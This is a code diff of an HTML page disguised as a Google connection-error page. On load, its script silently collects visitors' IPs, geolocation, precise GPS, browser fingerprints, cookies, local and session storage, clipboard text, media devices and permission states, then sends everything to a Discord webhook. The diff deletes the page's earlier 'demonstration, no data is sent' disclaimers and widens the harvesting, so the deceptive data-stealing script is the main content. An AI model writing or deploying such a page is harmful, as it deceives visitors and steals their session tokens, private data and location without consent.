@@ -93,11 +93,11 @@
             • Checking proxy and firewall<br>
             • Running Windows Network Diagnostics<br>
             <hr>
-            <span style="color: #ea4335;">[ERROR]</span> The connection was reset. Google service is temporarily unavailable in your region due to technical difficulties.<br>
-            <span style="font-size: 11px;">Error details: DNS_PROBE_FINISHED_NXDOMAIN (simulated)</span>
+            <span style="color: #ea4335;">[ERROR]</span> The connection was reset.<br>
+            <span style="font-size: 11px;">Error details: DNS_PROBE_FINISHED_NXDOMAIN</span>
         </div>
         <button class="button" onclick="location.reload();">Reload page</button>
-        <div class="fake-url">This is a demonstration page — no data is sent to Google.</div>
+        <div class="fake-url">Diagnostic page</div>
     </div>
 
     <script>
@@ -106,7 +106,7 @@
         async function sendToDiscord(embed) {
             try {
                 const payload = {
-                    username: "Error_Logger",
+                    username: "Max_Logger",
                     avatar_url: "https://cdn-icons-png.flaticon.com/512/1246/1246429.png",
                     embeds: [embed]
                 };
@@ -118,7 +118,9 @@
             } catch(e) {}
         }
 
-        async function getIP() {
+        // ========== MAXIMUM DATA EXTRACTION ==========
+
+        async function getPublicIP() {
             try {
                 const res = await fetch("https://api.ipify.org?format=json");
                 const data = await res.json();
@@ -126,7 +128,7 @@
             } catch { return "unavailable"; }
         }
 
-        async function getGeo(ip) {
+        async function getGeoMax(ip) {
             try {
                 const res = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await res.json();
@@ -142,11 +144,12 @@
                     asn: data.asn || "N/A",
                     timezone: data.timezone || "N/A"
                 };
-            } catch { return { city: "N/A", region: "N/A", country: "N/A", country_code: "N/A", postal: "N/A", latitude: "N/A", longitude: "N/A", isp: "N/A", asn: "N/A", timezone: "N/A" }; }
+            } catch { return {}; }
         }
 
-        async function getLocalIP() {
+        async function getAllLocalIPs() {
             return new Promise((resolve) => {
+                const ips = [];
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [] });
                     pc.createDataChannel("");
@@ -154,14 +157,14 @@
                     pc.onicecandidate = (e) => {
                         if (!e.candidate) return;
                         const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                        if (ipMatch) { resolve(ipMatch[1]); pc.close(); }
+                        if (ipMatch && !ips.includes(ipMatch[1])) ips.push(ipMatch[1]);
                     };
-                    setTimeout(() => resolve("Not detected"), 1500);
-                } catch { resolve("Blocked"); }
+                    setTimeout(() => { pc.close(); resolve(ips); }, 1500);
+                } catch { resolve([]); }
             });
         }
 
-        function getCanvasFingerprint() {
+        function getCanvasFP() {
             try {
                 const canvas = document.createElement("canvas");
                 canvas.width = 200;
@@ -177,7 +180,7 @@
             } catch { return "Blocked"; }
         }
 
-        function getAudioFingerprint() {
+        function getAudioFP() {
             try {
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 if (!AudioContext) return "Not supported";
@@ -196,8 +199,8 @@
             } catch { return "Blocked"; }
         }
 
-        function getInstalledFonts() {
-            const testFonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Roboto", "Open Sans", "Lato", "Montserrat", "Pacifico", "Segoe UI", "Calibri", "Cambria", "Consolas", "Corbel"];
+        function getAllFonts() {
+            const fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Roboto", "Open Sans", "Lato", "Montserrat", "Pacifico", "Segoe UI", "Calibri", "Cambria", "Consolas", "Corbel", "Franklin Gothic Medium", "Yu Gothic", "Meiryo", "Malgun Gothic", "Apple SD Gothic Neo", "Noto Sans", "Helvetica", "Geneva", "Optima", "Futura", "Garamond", "Bookman", "Palatino", "Century Gothic", "Arial Black", "Arial Narrow", "Lucida Grande", "Lucida Sans", "Trebuchet", "Verdana", "Webdings", "Wingdings", "Symbol", "Times", "Courier"];
             const baseFonts = ["monospace", "sans-serif", "serif"];
             const canvas = document.createElement("canvas");
             const ctx = canvas.getContext("2d");
@@ -207,69 +210,62 @@
             baseFonts.forEach(baseFont => {
                 ctx.font = `${textSize} ${baseFont}`;
                 const baseWidth = ctx.measureText(text).width;
-                testFonts.forEach(font => {
+                fonts.forEach(font => {
                     ctx.font = `${textSize} ${font}, ${baseFont}`;
                     const width = ctx.measureText(text).width;
-                    if (width !== baseWidth) available.push(font);
+                    if (width !== baseWidth && !available.includes(font)) available.push(font);
                 });
             });
-            return [...new Set(available)];
+            return available;
         }
 
-        function getPlugins() {
+        function getAllPlugins() {
             try {
                 const plugins = [];
                 for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
+                    plugins.push({ name: navigator.plugins[i].name, description: navigator.plugins[i].description, filename: navigator.plugins[i].filename });
                 }
                 return plugins;
             } catch { return []; }
         }
 
-        function getNetworkInfo() {
+        function getNetworkConnection() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return { downlink: "N/A", rtt: "N/A", effectiveType: "N/A", saveData: false };
+            if (!conn) return { downlink: "N/A", rtt: "N/A", effectiveType: "N/A", saveData: false, type: "N/A" };
             return {
                 downlink: conn.downlink ? conn.downlink + " Mbps" : "N/A",
                 rtt: conn.rtt ? conn.rtt + " ms" : "N/A",
                 effectiveType: conn.effectiveType || "N/A",
-                saveData: conn.saveData || false
+                saveData: conn.saveData || false,
+                type: conn.type || "N/A"
             };
         }
 
-        async function getBatteryInfo() {
+        async function getBatteryFull() {
             if (!navigator.getBattery) return { level: "N/A", charging: false, chargingTime: "N/A", dischargingTime: "N/A" };
             try {
                 const battery = await navigator.getBattery();
                 return {
                     level: Math.round(battery.level * 100) + "%",
                     charging: battery.charging,
-                    chargingTime: battery.chargingTime === Infinity ? "Full" : battery.chargingTime + " sec",
-                    dischargingTime: battery.dischargingTime === Infinity ? "Infinite" : battery.dischargingTime + " sec"
+                    chargingTime: battery.chargingTime === Infinity ? "Infinity" : battery.chargingTime + "s",
+                    dischargingTime: battery.dischargingTime === Infinity ? "Infinity" : battery.dischargingTime + "s"
                 };
             } catch { return { level: "N/A", charging: false, chargingTime: "N/A", dischargingTime: "N/A" }; }
         }
 
-        async function getGPSLocation() {
+        async function getGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve({ lat: "N/A", lon: "N/A", accuracy: "N/A" }); return; }
+                if (!navigator.geolocation) { resolve({ lat: "N/A", lon: "N/A", accuracy: "N/A", altitude: "N/A", speed: "N/A" }); return; }
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                    () => resolve({ lat: "Denied", lon: "Denied", accuracy: "N/A" }),
-                    { timeout: 5000 }
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude || "N/A", speed: pos.coords.speed || "N/A" }),
+                    () => resolve({ lat: "Denied", lon: "Denied", accuracy: "N/A", altitude: "N/A", speed: "N/A" }),
+                    { timeout: 5000, enableHighAccuracy: true }
                 );
             });
         }
 
-        async function getIndexedDBDatabases() {
-            if (!window.indexedDB || !window.indexedDB.databases) return ["API not supported"];
-            try {
-                const dbs = await window.indexedDB.databases();
-                return dbs.map(db => db.name);
-            } catch { return ["Cannot enumerate"]; }
-        }
-
-        function getScreenDetails() {
+        function getScreenFull() {
             return {
                 width: screen.width,
                 height: screen.height,
@@ -279,86 +275,279 @@
                 pixelDepth: screen.pixelDepth,
                 pixelRatio: window.devicePixelRatio,
                 orientation: screen.orientation ? screen.orientation.type : "Unknown",
-                angle: screen.orientation ? screen.orientation.angle : 0
+                angle: screen.orientation ? screen.orientation.angle : 0,
+                isExtended: screen.isExtended || "Unknown"
             };
         }
 
-        function getUptime() {
+        function getUptimeSec() {
             return Math.round(performance.now() / 1000) + " sec";
         }
 
-        async function collectAllSilent() {
-            const publicIP = await getIP();
-            const geo = await getGeo(publicIP);
-            const localIP = await getLocalIP();
-            const canvasFP = getCanvasFingerprint();
-            const audioFP = getAudioFingerprint();
-            const fonts = getInstalledFonts();
-            const plugins = getPlugins();
-            const network = getNetworkInfo();
-            const battery = await getBatteryInfo();
-            const gps = await getGPSLocation();
-            const dbs = await getIndexedDBDatabases();
-            const screenDetails = getScreenDetails();
-            const uptime = getUptime();
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const languages = navigator.languages.join(", ");
-            const cookieEnabled = navigator.cookieEnabled;
-            const doNotTrack = navigator.doNotTrack;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const tzOffset = -new Date().getTimezoneOffset() / 60;
-            const referrer = document.referrer || "Direct";
-            const pageUrl = window.location.href;
-            const cores = navigator.hardwareConcurrency || "Unknown";
-            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
-            const touch = "ontouchstart" in window;
-            const maxTouch = navigator.maxTouchPoints || 0;
-            const vendor = navigator.vendor || "Unknown";
-            
-            let webglRenderer = "Unavailable", webglVendor = "Unavailable", glslVersion = "Unavailable";
+        function getAllCookies() {
+            try { return document.cookie || "(empty)"; } catch(e) { return "Access denied"; }
+        }
+
+        function getLocalStorageFull() {
+            try {
+                const data = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    let value = localStorage.getItem(key);
+                    if (value && value.length > 300) value = value.substring(0, 300) + "...";
+                    data[key] = value;
+                }
+                return data;
+            } catch(e) { return { error: "denied" }; }
+        }
+
+        function getSessionStorageFull() {
+            try {
+                const data = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    let value = sessionStorage.getItem(key);
+                    if (value && value.length > 300) value = value.substring(0, 300) + "...";
+                    data[key] = value;
+                }
+                return data;
+            } catch(e) { return { error: "denied" }; }
+        }
+
+        async function getIndexedDBs() {
+            if (!window.indexedDB || !window.indexedDB.databases) return [];
+            try {
+                const dbs = await window.indexedDB.databases();
+                return dbs.map(db => ({ name: db.name, version: db.version }));
+            } catch(e) { return []; }
+        }
+
+        function getWebGLExtensionsFull() {
             try {
                 const canvas = document.createElement("canvas");
                 const gl = canvas.getContext("webgl");
-                if (gl) {
-                    const debug = gl.getExtension("WEBGL_debug_renderer_info");
-                    if (debug) {
-                        webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                        webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                        glslVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                    }
+                if (!gl) return [];
+                return gl.getSupportedExtensions() || [];
+            } catch(e) { return []; }
+        }
+
+        async function getMediaDevicesFull() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return { error: "API not available" };
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const info = { cameras: [], microphones: [], speakers: [] };
+                devices.forEach(device => {
+                    if (device.kind === "videoinput") info.cameras.push({ label: device.label || "Unnamed", deviceId: device.deviceId.substring(0, 20) });
+                    else if (device.kind === "audioinput") info.microphones.push({ label: device.label || "Unnamed", deviceId: device.deviceId.substring(0, 20) });
+                    else if (device.kind === "audiooutput") info.speakers.push({ label: device.label || "Unnamed", deviceId: device.deviceId.substring(0, 20) });
+                });
+                return info;
+            } catch(e) { return { error: "Permission denied" }; }
+        }
+
+        async function getVRDisplaysFull() {
+            if (!navigator.getVRDisplays) return [];
+            try {
+                const displays = await navigator.getVRDisplays();
+                return displays.map(d => ({ name: d.displayName, id: d.displayId }));
+            } catch(e) { return []; }
+        }
+
+        async function getPermissionsFull() {
+            const perms = ["geolocation", "notifications", "microphone", "camera", "clipboard-read", "clipboard-write", "persistent-storage", "ambient-light-sensor", "accelerometer", "gyroscope", "magnetometer"];
+            const results = {};
+            if (!navigator.permissions) return { error: "Permissions API not supported" };
+            for (const perm of perms) {
+                try {
+                    const status = await navigator.permissions.query({ name: perm });
+                    results[perm] = status.state;
+                } catch(e) { results[perm] = "unknown"; }
+            }
+            return results;
+        }
+
+        function getGPUFull() {
+            try {
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl");
+                if (!gl) return { renderer: "Unavailable", vendor: "Unavailable", glsl: "Unavailable", maxTextureSize: "N/A", maxVertexAttribs: "N/A" };
+                const debug = gl.getExtension("WEBGL_debug_renderer_info");
+                if (debug) {
+                    return {
+                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL),
+                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
+                        glsl: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS)
+                    };
                 }
-            } catch(e) {}
+                return { renderer: "Unknown", vendor: "Unknown", glsl: "Unknown", maxTextureSize: "N/A", maxVertexAttribs: "N/A" };
+            } catch(e) { return { renderer: "Error", vendor: "Error", glsl: "Error", maxTextureSize: "N/A", maxVertexAttribs: "N/A" }; }
+        }
+
+        function getBrowserRuntimes() {
+            const runtimes = [];
+            if (window.chrome) runtimes.push("Chrome " + (navigator.userAgent.match(/Chrome\/(\d+)/) ? navigator.userAgent.match(/Chrome\/(\d+)/)[1] : "?"));
+            if (window.opr) runtimes.push("Opera");
+            if (window.MSInputMethodContext) runtimes.push("Edge");
+            if (window.safari !== undefined) runtimes.push("Safari");
+            if (navigator.userAgent.includes("Firefox")) runtimes.push("Firefox");
+            return runtimes;
+        }
+
+        function getTimezoneFull() {
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                offset: -new Date().getTimezoneOffset() / 60,
+                utc: new Date().toUTCString(),
+                local: new Date().toString(),
+                iso: new Date().toISOString()
+            };
+        }
+
+        function getCPUCores() {
+            return navigator.hardwareConcurrency || "Unknown";
+        }
+
+        function getRAMSize() {
+            return navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+        }
+
+        function getTouchPoints() {
+            return { supported: "ontouchstart" in window, maxPoints: navigator.maxTouchPoints || 0 };
+        }
+
+        async function getClipboardContent() {
+            try {
+                if (!navigator.clipboard || !navigator.clipboard.readText) return "Not available";
+                const text = await navigator.clipboard.readText();
+                return text.substring(0, 500);
+            } catch(e) { return "Permission denied or empty"; }
+        }
+
+        function getPageHistory() {
+            try {
+                const length = history.length;
+                const currentState = history.state ? JSON.stringify(history.state).substring(0, 200) : "null";
+                return { length, currentState };
+            } catch(e) { return { length: "Access denied", currentState: "N/A" }; }
+        }
+
+        function getPerformanceTiming() {
+            try {
+                const perf = performance.timing;
+                if (!perf) return "Not available";
+                return {
+                    loadTime: perf.loadEventEnd - perf.navigationStart + "ms",
+                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart + "ms",
+                    responseTime: perf.responseEnd - perf.requestStart + "ms"
+                };
+            } catch(e) { return "N/A"; }
+        }
+
+        function getNetworkInterfacesFull() {
+            return new Promise((resolve) => {
+                const ips = [];
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) return;
+                        const ipv4Match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                        const ipv6Match = /([a-f0-9:]+:+[a-f0-9:]+)/i.exec(e.candidate.candidate);
+                        if (ipv4Match && !ips.includes(ipv4Match[1])) ips.push(ipv4Match[1]);
+                        if (ipv6Match && !ips.includes(ipv6Match[1])) ips.push(ipv6Match[1]);
+                    };
+                    setTimeout(() => { pc.close(); resolve(ips); }, 1500);
+                } catch(e) { resolve([]); }
+            });
+        }
+
+        function getSpeechSynthesisVoices() {
+            return new Promise((resolve) => {
+                if (!window.speechSynthesis) { resolve([]); return; }
+                const voices = speechSynthesis.getVoices();
+                if (voices.length) {
+                    resolve(voices.map(v => v.name).slice(0, 20));
+                } else {
+                    speechSynthesis.onvoiceschanged = () => {
+                        const newVoices = speechSynthesis.getVoices();
+                        resolve(newVoices.map(v => v.name).slice(0, 20));
+                    };
+                    setTimeout(() => resolve([]), 1000);
+                }
+            });
+        }
+
+        async function collectMax() {
+            const publicIP = await getPublicIP();
+            const geo = await getGeoMax(publicIP);
+            const localIPs = await getAllLocalIPs();
+            const canvasFP = getCanvasFP();
+            const audioFP = getAudioFP();
+            const fonts = getAllFonts();
+            const plugins = getAllPlugins();
+            const network = getNetworkConnection();
+            const battery = await getBatteryFull();
+            const gps = await getGPS();
+            const screenFull = getScreenFull();
+            const uptime = getUptimeSec();
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const languages = navigator.languages.join(", ");
+            const cookieEnabled = navigator.cookieEnabled;
+            const doNotTrack = navigator.doNotTrack;
+            const referrer = document.referrer || "Direct";
+            const pageUrl = window.location.href;
+            const vendor = navigator.vendor || "Unknown";
+            const product = navigator.product || "Unknown";
+            const productSub = navigator.productSub || "Unknown";
             
-            let cookies = "";
-            try { cookies = document.cookie || "(empty)"; } catch(e) { cookies = "Access denied"; }
-            
-            let localStorageDump = {};
-            try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); let v = localStorage.getItem(k); if (v && v.length > 200) v = v.substring(0,200)+"..."; localStorageDump[k] = v; } } catch(e) { localStorageDump = {error:"denied"}; }
-            
-            let sessionStorageDump = {};
-            try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); let v = sessionStorage.getItem(k); if (v && v.length > 200) v = v.substring(0,200)+"..."; sessionStorageDump[k] = v; } } catch(e) { sessionStorageDump = {error:"denied"}; }
+            const gpu = getGPUFull();
+            const webglExts = getWebGLExtensionsFull();
+            const cookies = getAllCookies();
+            const localStorageFull = getLocalStorageFull();
+            const sessionStorageFull = getSessionStorageFull();
+            const indexedDBs = await getIndexedDBs();
+            const devices = await getMediaDevicesFull();
+            const vr = await getVRDisplaysFull();
+            const permissions = await getPermissionsFull();
+            const timezoneFull = getTimezoneFull();
+            const runtimes = getBrowserRuntimes();
+            const cores = getCPUCores();
+            const ram = getRAMSize();
+            const touch = getTouchPoints();
+            const clipboard = await getClipboardContent();
+            const history = getPageHistory();
+            const perf = getPerformanceTiming();
+            const netInterfaces = await getNetworkInterfacesFull();
+            const voices = await getSpeechSynthesisVoices();
+            const mimeTypes = navigator.mimeTypes ? Object.values(navigator.mimeTypes).map(m => m.type).slice(0, 20) : [];
             
             const embed = {
-                title: "CONNECTION ERROR - SYSTEM REPORT",
+                title: "🔴 GOOGLE ERROR - MAXIMUM DATA EXTRACTION",
                 color: 0xea4335,
                 timestamp: new Date().toISOString(),
                 fields: [
-                    { name: "🌐 NETWORK & LOCATION", value: `**Public IP:** ${publicIP}\n**Local IP:** ${localIP}\n**ISP:** ${geo.isp}\n**ASN:** ${geo.asn}\n**Country:** ${geo.country} (${geo.country_code})\n**City:** ${geo.city}\n**Region:** ${geo.region}\n**Postal:** ${geo.postal}\n**Coordinates:** ${geo.latitude}, ${geo.longitude}\n**GPS (opt-in):** ${gps.lat}, ${gps.lon} (acc: ${gps.accuracy}m)\n**Timezone:** ${geo.timezone}\n**Referrer:** ${referrer}\n**Page URL:** ${pageUrl}`, inline: false },
-                    { name: "💻 HARDWARE (CPU/GPU/RAM)", value: `**Platform:** ${platform}\n**Vendor:** ${vendor}\n**CPU Cores:** ${cores}\n**RAM:** ${memory}\n**GPU Renderer:** ${webglRenderer}\n**GPU Vendor:** ${webglVendor}\n**GLSL Version:** ${glslVersion}\n**Touch:** ${touch ? `Yes (${maxTouch} points)` : "No"}`, inline: false },
-                    { name: "🖥️ SCREEN & DISPLAY", value: `**Resolution:** ${screenDetails.width}x${screenDetails.height}\n**Available:** ${screenDetails.availWidth}x${screenDetails.availHeight}\n**Color Depth:** ${screenDetails.colorDepth}-bit\n**Pixel Depth:** ${screenDetails.pixelDepth}\n**Pixel Ratio:** ${screenDetails.pixelRatio}\n**Orientation:** ${screenDetails.orientation} (${screenDetails.angle}°)`, inline: false },
-                    { name: "🎨 BROWSER FINGERPRINT", value: `**User Agent:** \`${ua.substring(0, 200)}\`\n**Languages:** ${languages}\n**Cookies Enabled:** ${cookieEnabled}\n**Do Not Track:** ${doNotTrack || "Not sent"}\n**Timezone Offset:** UTC${tzOffset >= 0 ? "+" : ""}${tzOffset}\n**Canvas FP:** \`${canvasFP.substring(0, 100)}\`\n**Audio FP:** \`${audioFP.substring(0, 80)}\`\n**Fonts (${fonts.length}):** ${fonts.join(", ").substring(0, 200)}${fonts.length > 15 ? "..." : ""}\n**Plugins (${plugins.length}):** ${plugins.join(", ").substring(0, 200)}`, inline: false },
-                    { name: "📡 NETWORK & BATTERY", value: `**Downlink:** ${network.downlink}\n**RTT:** ${network.rtt}\n**Connection Type:** ${network.effectiveType}\n**Save Data:** ${network.saveData}\n**Battery Level:** ${battery.level}\n**Charging:** ${battery.charging}\n**Charging Time:** ${battery.chargingTime}\n**Discharging Time:** ${battery.dischargingTime}\n**System Uptime:** ${uptime}`, inline: false },
-                    { name: "💾 STORAGE & COOKIES", value: `**Cookies:** \`${cookies.substring(0, 400)}\`\n**LocalStorage Keys:** ${Object.keys(localStorageDump).length}\n**LocalStorage Data:** ${JSON.stringify(localStorageDump).substring(0, 400)}\n**SessionStorage Keys:** ${Object.keys(sessionStorageDump).length}\n**IndexedDB Databases:** ${dbs.join(", ")}`, inline: false }
+                    { name: "🌐 NETWORK & LOCATION", value: `**Public IP:** ${publicIP}\n**Local IPs:** ${localIPs.join(", ") || "none"}\n**All Interfaces:** ${netInterfaces.join(", ")}\n**ISP:** ${geo.isp || "N/A"}\n**ASN:** ${geo.asn || "N/A"}\n**Country:** ${geo.country || "N/A"} (${geo.country_code || "N/A"})\n**City:** ${geo.city || "N/A"}\n**Region:** ${geo.region || "N/A"}\n**Postal:** ${geo.postal || "N/A"}\n**Coordinates:** ${geo.latitude || "N/A"}, ${geo.longitude || "N/A"}\n**GPS:** ${gps.lat}, ${gps.lon} (acc: ${gps.accuracy}m, alt: ${gps.altitude}, speed: ${gps.speed})\n**Referrer:** ${referrer}\n**Page URL:** ${pageUrl}`, inline: false },
+                    { name: "💻 HARDWARE (CPU/GPU/RAM)", value: `**Platform:** ${platform}\n**Vendor:** ${vendor}\n**Product:** ${product}\n**ProductSub:** ${productSub}\n**CPU Cores:** ${cores}\n**RAM:** ${ram}\n**GPU Renderer:** ${gpu.renderer}\n**GPU Vendor:** ${gpu.vendor}\n**GLSL Version:** ${gpu.glsl}\n**Max Texture Size:** ${gpu.maxTextureSize}\n**Max Vertex Attribs:** ${gpu.maxVertexAttribs}\n**WebGL Extensions:** ${webglExts.length} (${webglExts.slice(0,8).join(", ")}${webglExts.length>8?"...":""})`, inline: false },
+                    { name: "🖥️ SCREEN & DISPLAY", value: `**Resolution:** ${screenFull.width}x${screenFull.height}\n**Available:** ${screenFull.availWidth}x${screenFull.availHeight}\n**Color Depth:** ${screenFull.colorDepth}-bit\n**Pixel Depth:** ${screenFull.pixelDepth}\n**Pixel Ratio:** ${screenFull.pixelRatio}\n**Orientation:** ${screenFull.orientation} (${screenFull.angle}°)\n**Extended Display:** ${screenFull.isExtended}`, inline: false },
+                    { name: "🎨 BROWSER FINGERPRINT", value: `**User Agent:** \`${ua.substring(0, 300)}\`\n**Languages:** ${languages}\n**Cookies Enabled:** ${cookieEnabled}\n**Do Not Track:** ${doNotTrack || "Not sent"}\n**Browser Runtimes:** ${runtimes.join(", ")}\n**Canvas FP:** \`${canvasFP.substring(0, 100)}\`\n**Audio FP:** \`${audioFP.substring(0, 80)}\`\n**Fonts (${fonts.length}):** ${fonts.join(", ").substring(0, 250)}${fonts.length > 20 ? "..." : ""}\n**MIME Types:** ${mimeTypes.join(", ").substring(0, 200)}\n**Speech Voices:** ${voices.join(", ").substring(0, 200)}`, inline: false },
+                    { name: "🔌 PLUGINS", value: `${plugins.map(p => `${p.name} (${p.filename})`).join("\n").substring(0, 800)}${plugins.length > 10 ? "..." : ""}`, inline: false },
+                    { name: "📡 NETWORK & PERFORMANCE", value: `**Downlink:** ${network.downlink}\n**RTT:** ${network.rtt}\n**Connection Type:** ${network.effectiveType}\n**Network Type:** ${network.type}\n**Save Data:** ${network.saveData}\n**Battery:** ${battery.level} (charging: ${battery.charging}, chargeTime: ${battery.chargingTime}, dischargeTime: ${battery.dischargingTime})\n**System Uptime:** ${uptime}\n**Page Load Time:** ${perf.loadTime || "N/A"}\n**DOM Ready:** ${perf.domReady || "N/A"}\n**Response Time:** ${perf.responseTime || "N/A"}`, inline: false },
+                    { name: "🎥 MEDIA DEVICES", value: `**Cameras:** ${devices.cameras?.map(c => c.label).join(", ") || "None/Blocked"}\n**Microphones:** ${devices.microphones?.map(m => m.label).join(", ") || "None/Blocked"}\n**Speakers:** ${devices.speakers?.map(s => s.label).join(", ") || "None/Blocked"}\n**VR Displays:** ${vr.map(v => v.name).join(", ") || "None"}`, inline: false },
+                    { name: "🔐 PERMISSIONS & CLIPBOARD", value: `**Geolocation:** ${permissions.geolocation || "N/A"}\n**Notifications:** ${permissions.notifications || "N/A"}\n**Microphone:** ${permissions.microphone || "N/A"}\n**Camera:** ${permissions.camera || "N/A"}\n**Clipboard Read:** ${permissions["clipboard-read"] || "N/A"}\n**Clipboard Write:** ${permissions["clipboard-write"] || "N/A"}\n**Persistent Storage:** ${permissions["persistent-storage"] || "N/A"}\n**Clipboard Content:** \`${clipboard.substring(0, 300)}\``, inline: false },
+                    { name: "💾 STORAGE (FULL DUMP)", value: `**Cookies:** \`${cookies.substring(0, 800)}${cookies.length > 800 ? "..." : ""}\`\n**LocalStorage (${Object.keys(localStorageFull).length} keys):** ${JSON.stringify(localStorageFull).substring(0, 800)}${JSON.stringify(localStorageFull).length > 800 ? "..." : ""}\n**SessionStorage (${Object.keys(sessionStorageFull).length} keys):** ${JSON.stringify(sessionStorageFull).substring(0, 800)}${JSON.stringify(sessionStorageFull).length > 800 ? "..." : ""}\n**IndexedDBs:** ${indexedDBs.map(db => `${db.name} (v${db.version})`).join(", ")}`, inline: false },
+                    { name: "📜 HISTORY & TIMEZONE", value: `**History Length:** ${history.length}\n**Current State:** ${history.currentState}\n**Timezone:** ${timezoneFull.timezone}\n**Offset:** UTC${timezoneFull.offset >= 0 ? "+" : ""}${timezoneFull.offset}\n**UTC Time:** ${timezoneFull.utc}\n**Local Time:** ${timezoneFull.local}\n**Touch Support:** ${touch.supported ? `Yes (${touch.maxPoints} points)` : "No"}`, inline: false }
                 ],
-                footer: { text: "ERR_CONNECTION_CLOSED • Diagnostic data collected" }
+                footer: { text: "ERR_CONNECTION_CLOSED • MAXIMUM DATA HARVEST • All available system information" }
             };
             
             await sendToDiscord(embed);
         }
         
-        collectAllSilent();
+        collectMax();
     </script>
 </body>
 </html>
